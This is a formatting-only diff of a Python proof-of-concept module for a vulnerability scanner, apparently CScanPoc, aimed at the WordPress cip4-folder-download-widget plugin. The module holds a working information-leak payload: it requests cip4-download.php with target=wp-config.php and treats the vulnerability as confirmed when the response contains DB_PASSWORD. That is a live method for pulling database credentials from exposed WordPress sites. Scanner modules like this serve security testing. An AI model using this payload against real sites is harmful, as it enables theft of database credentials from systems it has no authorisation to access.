@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0043' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0043'  # 平台漏洞编号，留空
     name = 'WordPress 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         WordPress 信息泄露。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress cip4-folder-download-widget'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'aedd2ec2-5e7b-42aa-9d10-d8f392718eb9'
@@ -31,13 +33,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php'
-            verify_url = self.target  + payload
+            verify_url = self.target + payload
             r = requests.get(verify_url)
-            
+
             if r.status_code == 200 and 'DB_PASSWORD' in r.content:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
